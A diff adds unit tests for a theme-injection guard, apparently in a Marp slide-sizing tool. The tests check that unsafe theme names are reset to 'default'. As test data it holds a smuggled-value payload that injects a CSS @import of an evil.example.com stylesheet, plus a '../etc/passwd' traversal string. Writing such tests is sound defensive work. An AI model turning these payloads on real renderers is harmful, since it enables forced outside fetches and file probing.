@@ -145,6 +145,43 @@ describe("applyCustomMarpSize — aspect-ratio presets", () => {
   });
 });
 
+describe("applyCustomMarpSize — theme injection guard", () => {
+  it("ignores a hostile theme name when composing the @import", () => {
+    const marp = makeFakeMarp();
+    // Frontmatter-controlled theme name with embedded quotes + @import.
+    // Without the allowlist guard, this would land in the generated CSS
+    // and cause Puppeteer to fetch the external stylesheet during PDF
+    // render (no CSP on the server side).
+    const hostile = `theme: '"; @import "https://evil.example.com/css"; /*'`;
+    const source = `---\nmarp: true\n${hostile}\nsize: 1080x1920\n---\n# x`;
+    const out = applyCustomMarpSize(marp, source);
+    assert.equal(marp.themeSet.calls.length, 1);
+    // The composed CSS must NOT carry the attacker's payload — the
+    // unsafe theme should have been collapsed back to "default".
+    assert.doesNotMatch(marp.themeSet.calls[0], /evil\.example\.com/);
+    assert.match(marp.themeSet.calls[0], /@import "default"/);
+    assert.match(out, /theme: mc_size_default_1080x1920/);
+  });
+
+  it("accepts whitelisted characters (alphanumeric / underscore / hyphen)", () => {
+    const marp = makeFakeMarp();
+    const source = `---\nmarp: true\ntheme: gaia_2\nsize: 1080x1920\n---\n# x`;
+    applyCustomMarpSize(marp, source);
+    assert.match(marp.themeSet.calls[0], /@import "gaia_2"/);
+  });
+
+  it("rejects theme names with whitespace, dots, or other CSS-relevant chars", () => {
+    const marp = makeFakeMarp();
+    for (const bad of ["my theme", "../etc/passwd", "theme;", 'default"', "ev/il"]) {
+      const source = `---\nmarp: true\ntheme: ${JSON.stringify(bad)}\nsize: 1080x1920\n---\n# x`;
+      applyCustomMarpSize(marp, source);
+    }
+    for (const call of marp.themeSet.calls) {
+      assert.match(call, /@import "default"/);
+    }
+  });
+});
+
 describe("applyCustomMarpSize — body preservation", () => {
   it("preserves the body verbatim, including embedded slide separators", () => {
     const marp = makeFakeMarp();
